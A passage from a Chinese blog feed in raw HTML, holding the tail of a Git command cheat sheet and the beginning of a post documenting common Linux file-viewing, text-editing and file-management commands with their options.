class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs perl">git init                                                  <span class="hljs-comment"># 初始化本地git仓库（创建新仓库） </span><br>git config --global user.name <span class="hljs-string">&quot;xxx&quot;</span>                       <span class="hljs-comment"># 配置用户名 </span><br>git config --global user.email <span class="hljs-string">&quot;xxx@xxx.com&quot;</span>              <span class="hljs-comment"># 配置邮件 </span><br>git config --global color.ui true                         <span class="hljs-comment"># git status等命令自动着色 </span><br>git config --global color.status auto <br>git config --global color.diff auto <br>git config --global color.branch auto <br>git config --global color.interactive auto <br>git clone git+ssh:<span class="hljs-regexp">//gi</span>t@192.<span class="hljs-number">168.53</span>.<span class="hljs-number">168</span>/VT.git             <span class="hljs-comment"># clone远程仓库 </span><br>git status                                                <span class="hljs-comment"># 查看当前版本状态（是否修改） </span><br>git add xyz                                               <span class="hljs-comment"># 添加xyz文件至index </span><br>git add .                                                 <span class="hljs-comment"># 增加当前子目录下所有更改过的文件至index </span><br>git commit -m <span class="hljs-string">&#x27;xxx&#x27;</span>                                       <span class="hljs-comment"># 提交 </span><br>git commit --amend -m <span class="hljs-string">&#x27;xxx&#x27;</span>                               <span class="hljs-comment"># 合并上一次提交（用于反复修改） </span><br>git commit -am <span class="hljs-string">&#x27;xxx&#x27;</span>                                      <span class="hljs-comment"># 将add和commit合为一步 </span><br>git rm xxx                                                <span class="hljs-comment"># 删除index中的文件 </span><br>git rm -r *                                               <span class="hljs-comment"># 递归删除 </span><br>git <span class="hljs-keyword">log</span>                                                   <span class="hljs-comment"># 显示提交日志 </span><br>git <span class="hljs-keyword">log</span> -<span class="hljs-number">1</span>                                                <span class="hljs-comment"># 显示1行日志 -n为n行 </span><br>git <span class="hljs-keyword">log</span> -<span class="hljs-number">5</span><br>git <span class="hljs-keyword">log</span> --<span class="hljs-keyword">stat</span>                                            <span class="hljs-comment"># 显示提交日志及相关变动文件 </span><br>git <span class="hljs-keyword">log</span> -p -m <br>git show dfb02e6e4f2f7b573337763e5c0013802e392818         <span class="hljs-comment"># 显示某个提交的详细内容 </span><br>git show dfb02                                            <span class="hljs-comment"># 可只用commitid的前几位 </span><br>git show HEAD                                             <span class="hljs-comment"># 显示HEAD提交日志 </span><br>git show HEAD^                                            <span class="hljs-comment"># 显示HEAD的父（上一个版本）的提交日志 ^^为上两个版本 ^5为上5个版本 </span><br>git tag                                                   <span class="hljs-comment"># 显示已存在的tag </span><br>git tag -a v2.<span class="hljs-number">0</span> -m <span class="hljs-string">&#x27;xxx&#x27;</span>                                  <span class="hljs-comment"># 增加v2.0的tag </span><br>git show v2.<span class="hljs-number">0</span>                                             <span class="hljs-comment"># 显示v2.0的日志及详细内容 </span><br>git <span class="hljs-keyword">log</span> v2.<span class="hljs-number">0</span>                                              <span class="hljs-comment"># 显示v2.0的日志 </span><br>git diff                                                  <span class="hljs-comment"># 显示所有未添加至index的变更 </span><br>git diff --cached                                         <span class="hljs-comment"># 显示所有已添加index但还未commit的变更 </span><br>git diff HEAD^                                            <span class="hljs-comment"># 比较与上一个版本的差异 </span><br>git diff HEAD -- ./lib                                    <span class="hljs-comment"># 比较与HEAD版本lib目录的差异 </span><br>git diff origin/master..master                            <span class="hljs-comment"># 比较远程分支master上有本地分支master上没有的 </span><br>git diff origin/master..master --<span class="hljs-keyword">stat</span>                     <span class="hljs-comment"># 只显示差异的文件，不显示具体内容 </span><br>git remote add origin git+ssh:<span class="hljs-regexp">//gi</span>t@192.<span class="hljs-number">168.53</span>.<span class="hljs-number">168</span>/VT.git <span class="hljs-comment"># 增加远程定义（用于push/pull/fetch） </span><br>git branch                                                <span class="hljs-comment"># 显示本地分支 </span><br>git branch --contains <span class="hljs-number">50089</span>                               <span class="hljs-comment"># 显示包含提交50089的分支 </span><br>git branch -a                                             <span class="hljs-comment"># 显示所有分支 </span><br>git branch -r                                             <span class="hljs-comment"># 显示所有原创分支 </span><br>git branch --merged                                       <span class="hljs-comment"># 显示所有已合并到当前分支的分支 </span><br>git branch --<span class="hljs-keyword">no</span>-merged                                    <span class="hljs-comment"># 显示所有未合并到当前分支的分支 </span><br>git branch -m master master_copy                          <span class="hljs-comment"># 本地分支改名 </span><br>git checkout -b master_copy                               <span class="hljs-comment"># 从当前分支创建新分支master_copy并检出 </span><br>git checkout -b master master_copy                        <span class="hljs-comment"># 上面的完整版 </span><br>git checkout features/performance                         <span class="hljs-comment"># 检出已存在的features/performance分支 </span><br>git checkout --track hotfixes/BJVEP933                    <span class="hljs-comment"># 检出远程分支hotfixes/BJVEP933并创建本地跟踪分支</span><br>git checkout v2.<span class="hljs-number">0</span>                                         <span class="hljs-comment"># 检出版本v2.0</span><br>git checkout -b devel origin/develop                      <span class="hljs-comment"># 从远程分支develop创建新本地分支devel并检出 </span><br>git checkout -- README                                    <span class="hljs-comment"># 检出head版本的README文件（可用于修改错误回退） </span><br>git merge origin/master                                   <span class="hljs-comment"># 合并远程master分支至当前分支 </span><br>git cherry-pick ff44785404a8e                             <span class="hljs-comment"># 合并提交ff44785404a8e的修改 </span><br>git <span class="hljs-keyword">push</span> origin master                                    <span class="hljs-comment"># 将当前分支push到远程master分支 </span><br>git <span class="hljs-keyword">push</span> origin :hotfixes/BJVEP933                        <span class="hljs-comment"># 删除远程仓库的hotfixes/BJVEP933分支 </span><br>git <span class="hljs-keyword">push</span> --tags                                           <span class="hljs-comment"># 把所有tag推送到远程仓库 </span><br>git fetch                                                 <span class="hljs-comment"># 获取所有远程分支（不更新本地分支，另需merge） </span><br>git fetch --prune                                         <span class="hljs-comment"># 获取所有原创分支并清除服务器上已删掉的分支 </span><br>git pull origin master                                    <span class="hljs-comment"># 获取远程分支master并merge到当前分支 </span><br>git mv README README2                                     <span class="hljs-comment"># 重命名文件README为README2 </span><br>git <span class="hljs-keyword">reset</span> --hard HEAD                                     <span class="hljs-comment"># 将当前版本重置为HEAD（通常用于merge失败回退） </span><br>git rebase <br>git branch -d hotfixes/BJVEP933                           <span class="hljs-comment"># 删除分支hotfixes/BJVEP933（本分支修改已合并到其他分支） </span><br>git branch -D hotfixes/BJVEP933                           <span class="hljs-comment"># 强制删除分支hotfixes/BJVEP933 </span><br>git ls-files                                              <span class="hljs-comment"># 列出git index包含的文件 </span><br>git show-branch                                           <span class="hljs-comment"># 图示当前分支历史 </span><br>git show-branch --all                                     <span class="hljs-comment"># 图示所有分支历史 </span><br>git whatchanged                                           <span class="hljs-comment"># 显示提交历史对应的文件修改 </span><br>git revert dfb02e6e4f2f7b573337763e5c0013802e392818       <span class="hljs-comment"># 撤销提交dfb02e6e4f2f7b573337763e5c0013802e392818 </span><br>git ls-tree HEAD                                          <span class="hljs-comment"># 内部命令：显示某个git对象 </span><br>git rev-parse v2.<span class="hljs-number">0</span>                                        <span class="hljs-comment"># 内部命令：显示某个ref对于的SHA1 HASH </span><br>git reflog                                                <span class="hljs-comment"># 显示所有提交，包括孤立节点 </span><br>git show HEAD@&#123;5&#125; <br>git show master@&#123;yesterday&#125;                               <span class="hljs-comment"># 显示master分支昨天的状态 </span><br>git <span class="hljs-keyword">log</span> --pretty=<span class="hljs-keyword">format</span>:<span class="hljs-string">&#x27;%h %s&#x27;</span> --graph                   <span class="hljs-comment"># 图示提交日志 </span><br>git show HEAD~<span class="hljs-number">3</span><br>git show -s --pretty=raw <span class="hljs-number">2</span>be7fcb476 <br>git stash                                                 <span class="hljs-comment"># 暂存当前修改，将所有至为HEAD状态 </span><br>git stash list                                            <span class="hljs-comment"># 查看所有暂存 </span><br>git stash show -p stash@&#123;0&#125;                               <span class="hljs-comment"># 参考第一次暂存 </span><br>git stash apply stash@&#123;0&#125;                                 <span class="hljs-comment"># 应用第一次暂存 </span><br>git <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;delete from&quot;</span>                                    <span class="hljs-comment"># 文件中搜索文本“delete from” </span><br>git <span class="hljs-keyword">grep</span> -e <span class="hljs-string">&#x27;#define&#x27;</span> --<span class="hljs-keyword">and</span> -e SORT_DIRENT <br>git gc <br>git fsck<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux常用命令学习</title>
    <link href="/blog/2020/09/03/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"/>
    <url>/blog/2020/09/03/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>最近闲来无事，系统的学习记录一下Linux的一些命令，方便以熟练的使用Linux系统。</strong></p><p><img src="/images/fj53.jpg"></p><span id="more"></span><h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><h3 id="文件查看"><a href="#文件查看" class="headerlink" title="文件查看"></a>文件查看</h3><h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p>cat 命令用于连接文件并打印到标准输出设备上。</p><p><strong>语法格式：</strong>cat [-AbeEnstTuv] [–help] [–version] fileName</p><p><strong>参数说明：</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-n 或 <span class="hljs-attr">--number</span>：由 <span class="hljs-number">1</span> 开始对所有输出的行数编号。<br>-<span class="hljs-selector-tag">b</span> 或 <span class="hljs-attr">--number-nonblank</span>：和 -n 相似，只不过对于空白行不编号。<br>-s 或 <span class="hljs-attr">--squeeze-blank</span>：当遇到有连续两行以上的空白行，就代换为一行的空白行。<br>-v 或 <span class="hljs-attr">--show-nonprinting</span>：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外。<br>-E 或 <span class="hljs-attr">--show-ends</span> : 在每行结束处显示 $。<br>-T 或 <span class="hljs-attr">--show-tabs</span>: 将 TAB 字符显示为 ^I。<br>-A, <span class="hljs-attr">--show-all</span>：等价于 -vET。<br></code></pre></td></tr></table></figure><h4 id="more"><a href="#more" class="headerlink" title="more"></a>more</h4><p>Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。</p><p>语法：more [-dlfpcsu] [-num] [+&#x2F;pattern] [+linenum] [fileNames..]</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-num 一次显示的行数</span><br><span class="hljs-deletion">-d 提示使用者，在画面下方显示 [Press space to continue, &#x27;q&#x27; to quit.] ，如果使用者按错键，则会显示 [Press &#x27;h&#x27; for instructions.] 而不是 &#x27;哔&#x27; 声</span><br><span class="hljs-deletion">-l 取消遇见特殊字元 ^L（送纸字元）时会暂停的功能</span><br><span class="hljs-deletion">-f 计算行数时，以实际上的行数，而非自动换行过后的行数（有些单行字数太长的会被扩展为两行或两行以上）</span><br><span class="hljs-deletion">-p 不以卷动的方式显示每一页，而是先清除萤幕后再显示内容</span><br><span class="hljs-deletion">-c 跟 -p 相似，不同的是先显示内容再清除其他旧资料</span><br><span class="hljs-deletion">-s 当遇到有连续两行以上的空白行，就代换为一行的空白行</span><br><span class="hljs-deletion">-u 不显示下引号 （根据环境变数 TERM 指定的 terminal 而有所不同）</span><br><span class="hljs-addition">+/pattern 在每个文档显示前搜寻该字串（pattern），然后从该字串之后开始显示</span><br><span class="hljs-addition">+num 从第 num 行开始显示</span><br>fileNames 欲显示内容的文档，可为复数个数<br></code></pre></td></tr></table></figure><h4 id="less"><a href="#less" class="headerlink" title="less"></a>less</h4><p>less 与 more 类似，但使用 less 可以随意浏览文件，而 more 仅能向前移动，却不能向后移动，而且 less 在查看之前不会加载整个文件。</p><p>语法：less [参数] 文件</p><p>参数：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm">-<span class="hljs-keyword">b</span> &lt;缓冲区大小&gt; 设置缓冲区的大小<br>/字符串：向下搜索<span class="hljs-string">&quot;字符串&quot;</span>的功能<br>?字符串：向上搜索<span class="hljs-string">&quot;字符串&quot;</span>的功能<br>空格键 滚动一页<br>回车键 滚动一行<br></code></pre></td></tr></table></figure><h3 id="文档编辑"><a href="#文档编辑" class="headerlink" title="文档编辑"></a>文档编辑</h3><p>基础的vim、nano等文本编辑器不再赘述</p><h4 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h4><p>Linux tr 命令用于转换或删除文件中的字符。<br>tr 指令从标准输入设备读取数据，经过字符串转译后，将结果输出到标准输出设备。</p><p>语法：</p><p>tr [-cdst][–help][–version][第一字符集][第二字符集]<br>tr [OPTION]…SET1[SET2]</p><p>参数：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada">-c, <span class="hljs-comment">--complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换 </span><br>-d, <span class="hljs-comment">--delete：删除指令字符</span><br>-s, <span class="hljs-comment">--squeeze-repeats：缩减连续重复的字符成指定的单个字符</span><br>-t, <span class="hljs-comment">--truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等</span><br><span class="hljs-comment">--help：显示程序用法信息</span><br><span class="hljs-comment">--version：显示程序本身的版本信息 </span><br></code></pre></td></tr></table></figure><h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>Linux sort命令用于将文本文件内容加以排序。<br>sort可针对文本文件的内容，以行为单位来排序。</p><p>语法：</p><p>sort [-bcdfimMnr][-o&lt;输出文件&gt;][-t&lt;分隔字符&gt;][+&lt;起始栏位&gt;-&lt;结束栏位&gt;][–help][–verison][文件]</p><p>参数：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-b 忽略每行前面开始出的空格字符。</span><br><span class="hljs-deletion">-c 检查文件是否已经按照顺序排序。</span><br><span class="hljs-deletion">-d 排序时，处理英文字母、数字及空格字符外，忽略其他的字符。</span><br><span class="hljs-deletion">-f 排序时，将小写字母视为大写字母。</span><br><span class="hljs-deletion">-i 排序时，除了040至176之间的ASCII字符外，忽略其他的字符。</span><br><span class="hljs-deletion">-m 将几个排序好的文件进行合并。</span><br><span class="hljs-deletion">-M 将前面3个字母依照月份的缩写进行排序。</span><br><span class="hljs-deletion">-n 依照数值的大小排序。</span><br><span class="hljs-deletion">-u 意味着是唯一的(unique)，输出的结果是去完重了的。</span><br><span class="hljs-deletion">-o&lt;输出文件&gt; 将排序后的结果存入指定的文件。</span><br><span class="hljs-deletion">-r 以相反的顺序来排序。</span><br></code></pre></td></tr></table></figure><h4 id="col"><a href="#col" class="headerlink" title="col"></a>col</h4><p>Linux col命令用于过滤控制字符。<br>在许多UNIX说明文件里，都有RLF控制字符。当我们运用shell特殊字符”&gt;”和”&gt;&gt;”，把说明文件的内容输出成纯文本文件时，控制字符会变成乱码，col指令则能有效滤除这些控制字符。</p><p>语法：</p><p>col [-bfx][-l&lt;缓冲区列数&gt;]</p><h4 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h4><p>Linux sed 命令是利用脚本来处理文本文件。<br>sed 可依照脚本的指令来处理、编辑文本文件。<br>Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sed <span class="hljs-selector-attr">[-hnV]</span><span class="hljs-selector-attr">[-e&lt;script&gt;]</span><span class="hljs-selector-attr">[-f&lt;script文件&gt;]</span><span class="hljs-selector-attr">[文本文件]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">参数说明：<br>-e&lt;script&gt;或<span class="hljs-attr">--expression</span>=&lt;script&gt; 以选项中指定的script来处理输入的文本文件。<br>-f&lt;script文件&gt;或<span class="hljs-attr">--file</span>=&lt;script文件&gt; 以选项中指定的script文件来处理输入的文本文件。<br>-h或<span class="hljs-attr">--help</span> 显示帮助。<br>-n或<span class="hljs-attr">--quiet</span>或<span class="hljs-attr">--silent</span> 仅显示script处理后的结果。<br>-V或<span class="hljs-attr">--version</span> 显示版本信息。<br>动作说明：<br><span class="hljs-selector-tag">a</span> ：新增， <span class="hljs-selector-tag">a</span> 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～<br>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！<br>d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；<br><span class="hljs-selector-tag">i</span> ：插入， <span class="hljs-selector-tag">i</span> 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；<br><span class="hljs-selector-tag">p</span> ：打印，亦即将某个选择的数据印出。通常 <span class="hljs-selector-tag">p</span> 会与参数 sed -n 一起运行～<br>s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 <span class="hljs-number">1</span>,<span class="hljs-number">20s</span>/old/new/g 就是啦！ <br></code></pre></td></tr></table></figure><h3 id="文件管理-1"><a href="#文件管理-1" class="headerlink" title="文件管理"></a>文件管理</h3><h4 id="chattr"><a href="#chattr" class="headerlink" title="chattr"></a>chattr</h4><p>Linux chattr命令用于改变文件属性。<br>这项指令可改变存放在ext2文件系统上的文件或目录属性，这些属性共有以下8种模式：<br>a：让文件或目录仅供附加用途。<br>b：不更新文件或目录的最后存取时间。<br>c：将文件或目录压缩后存放。<br>d：将文件或目录排除在倾倒操作之外。<br>i：不得任意更动文件或目录。<br>s：保密性删除文件或目录。<br>S：即时更新文件或目录。<br>u：预防意外删除。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">chattr <span class="hljs-selector-attr">[-RV]</span><span class="hljs-selector-attr">[-v&lt;版本编号&gt;]</span><span class="hljs-selector-attr">[+/-/=&lt;属性&gt;]</span><span class="hljs-selector-attr">[文件或目录...]</span><br></code></pre></td></tr></table></figure><p>参数：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">　　-R 递归处理，将指定目录下的所有文件及子目录一并处理。<br>　　-v<span class="hljs-tag">&lt;<span class="hljs-name">版本编号</span>&gt;</span> 设置文件或目录版本。<br>　　-V 显示指令执行过程。<br>　　+<span class="hljs-tag">&lt;<span class="hljs-name">属性</span>&gt;</span> 开启文件或目录的该项属性。<br>　　-<span class="hljs-tag">&lt;<span class="hljs-name">属性</span>&gt;</span> 关闭文件或目录的该项属性。<br>　　=<span class="hljs-tag">&lt;<span class="hljs-name">属性</span>&gt;</span> 指定文件或目录的该项属性。<br></code></pre></td></tr></table></figure><h4 id="chgrp"><a href="#chgrp" class="headerlink" title="chgrp"></a>chgrp</h4><p>Linux chgrp命令用于变更文件或目录的所属群组。<br>在UNIX系统家族里，文件或目录权限的掌控以拥有者及所属群组来管理。您可以使用chgrp指令去变更文件与目录的所属群组，设置方式采用群组名称或群组识别码皆可。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">chgrp <span class="hljs-selector-attr">[-cfhRv]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--version]</span><span class="hljs-selector-attr">[所属群组]</span><span class="hljs-selector-attr">[文件或目录...]</span> 或 chgrp <span class="hljs-selector-attr">[-cfhRv]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--reference=&lt;参考文件或目录&gt;]</span><span class="hljs-selector-attr">[--version]</span><span class="hljs-selector-attr">[文件或目录...]</span><br></code></pre></td></tr></table></figure><h4 id="chown"><a href="#chown" class="headerlink" title="chown"></a>chown</h4><p>利用 chown 将指定文件的拥有者改为指定的用户或组，用户可以是用户名或者用户ID；组可以是组名或者组ID；文件是以空格分开的要改变权限的文件列表，支持通配符。 。<br>一般来说，这个指令只有是由系统管理者(root)所使用，一般使用者没有权限可以改变别人的文件拥有者，也没有权限把自己的文件拥有者改设为别人。只有系统管理者(root)才有这样的权限。</p><p>语法：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">chown [-cfhvR] [--help] [--version] user[:group] file...<br></code></pre></td></tr></table></figure><p>参数：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ada">user : 新的文件拥有者的使用者 <span class="hljs-type">ID</span><br>group : 新的文件拥有者的使用者组(<span class="hljs-type">group</span>)<br>-c : 显示更改的部分的信息<br>-f : 忽略错误信息<br>-h :修复符号链接<br>-v : 显示详细的处理信息<br>-R : 处理指定目录以及其子目录下的所有文件<br><span class="hljs-comment">--help : 显示辅助说明</span><br><span class="hljs-comment">--version : 显示版本</span><br></code></pre></td></tr></table></figure><h4 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h4><p>Linux diff命令用于比较文件的差异。<br>diff以逐行的方式，比较文本文件的异同处。如果指定要比较目录，则diff会比较目录中相同文件名的文件，但不会比较其中子目录。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">diff <span class="hljs-selector-attr">[-abBcdefHilnNpPqrstTuvwy]</span><span class="hljs-selector-attr">[-&lt;行数&gt;]</span><span class="hljs-selector-attr">[-C &lt;行数&gt;]</span><span class="hljs-selector-attr">[-D &lt;巨集名称&gt;]</span><span class="hljs-selector-attr">[-I &lt;字符或字符串&gt;]</span><span class="hljs-selector-attr">[-S &lt;文件&gt;]</span><span class="hljs-selector-attr">[-W &lt;宽度&gt;]</span><span class="hljs-selector-attr">[-x &lt;文件或目录&gt;]</span><span class="hljs-selector-attr">[-X &lt;文件&gt;]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--left-column]</span><span class="hljs-selector-attr">[--suppress-common-line]</span><span class="hljs-selector-attr">[文件或目录1]</span><span class="hljs-selector-attr">[文件或目录2]</span><br></code></pre></td></tr></table></figure><p>后面加一个指令diffstat可以读取diff的输出结果，然后统计各文件的插入，删除，修改等差异计量。</p><h4 id="lsattr"><a href="#lsattr" class="headerlink" title="lsattr"></a>lsattr</h4><p>Linux lsattr命令用于显示文件属性。<br>用chattr执行改变文件或目录的属性，可执行lsattr指令查询其属性。</p><h4 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h4><p>Linux whereis命令用于查找文件。<br>该指令会在特定目录中查找符合条件的文件。这些文件应属于原始代码、二进制文件，或是帮助文件。<br>该指令只能用于查找二进制文件、源代码文件和man手册页，一般文件的定位需使用locate命令。</p><h4 id="locate"><a href="#locate" class="headerlink" title="locate"></a>locate</h4><p>Linux locate命令用于查找符合条件的文档，他会去保存文档和目录名称的数据库内，查找合乎范本样式条件的文档或目录。一般情况我们只需要输入 locate your_file_name 即可查找指定文件。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">locate <span class="hljs-selector-attr">[-d ]</span><span class="hljs-selector-attr">[--help]</span><span class="hljs-selector-attr">[--version]</span><span class="hljs-selector-attr">[范本样式...]</span><br></code></pre></td></tr></table></figure><p>参数：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">-</span><span class="hljs-comment">b</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">basename</span> <span class="hljs-literal">--</span> <span class="hljs-comment">仅匹配路径名的基本名称</span><br><span class="hljs-literal">-</span><span class="hljs-comment">c</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">count</span> <span class="hljs-literal">--</span> <span class="hljs-comment">只输出找到的数量</span><br><span class="hljs-literal">-</span><span class="hljs-comment">d</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">database DBPATH</span> <span class="hljs-literal">--</span> <span class="hljs-comment">使用 DBPATH 指定的数据库，而不是默认数据库 /var/lib/mlocate/mlocate</span><span class="hljs-string">.</span><span class="hljs-comment">db</span><br><span class="hljs-literal">-</span><span class="hljs-comment">e</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">existing</span> <span class="hljs-literal">--</span> <span class="hljs-comment">仅打印当前现有文件的条目</span><br><span class="hljs-literal">-</span><span class="hljs-comment">1</span> <span class="hljs-literal">--</span> <span class="hljs-comment">如果 是 1．则启动安全模式。在安全模式下，使用者不会看到权限无法看到 的档案。这会始速度减慢，因为 locate 必须至实际的档案系统中取得档案的 权限资料。</span><br><span class="hljs-literal">-</span><span class="hljs-comment">0</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">null</span> <span class="hljs-literal">--</span> <span class="hljs-comment">在输出上带有NUL的单独条目</span><br><span class="hljs-literal">-</span><span class="hljs-comment">S</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">statistics</span> <span class="hljs-literal">--</span> <span class="hljs-comment">不搜索条目，打印有关每个数据库的统计信息</span><br><span class="hljs-literal">-</span><span class="hljs-comment">q</span> <span class="hljs-literal">--</span> <span class="hljs-comment">安静模式，不会显示任何错误讯息。</span><br><span class="hljs-literal">-</span><span class="hljs-comment">P</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">nofollow</span><span class="hljs-string">,</span> <span class="hljs-literal">-</span><span class="hljs-comment">H</span> <span class="hljs-literal">--</span> <span class="hljs-comment">检查文件存在时不要遵循尾随的符号链接</span><br><span class="hljs-literal">-</span><span class="hljs-comment">l</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">limit</span><span class="hljs-string">,</span> <span class="hljs-literal">-</span><span class="hljs-comment">n LIMIT</span> <span class="hljs-literal">--</span> <span class="hljs-comment">将输出（或计数）限制为LIMIT个条目</span><br><span class="hljs-literal">-</span><span class="hljs-comment">n</span> <span class="hljs-literal">--</span> <span class="hljs-comment">至多显示 n个输出。</span><br><span class="hljs-literal">-</span><span class="hljs-comment">m</span><span class="hljs-string">,</span> <span class="hljs-literal">--</span><span class="hljs-comment">mmap</span> <span class="hljs-literal">--</span> <span 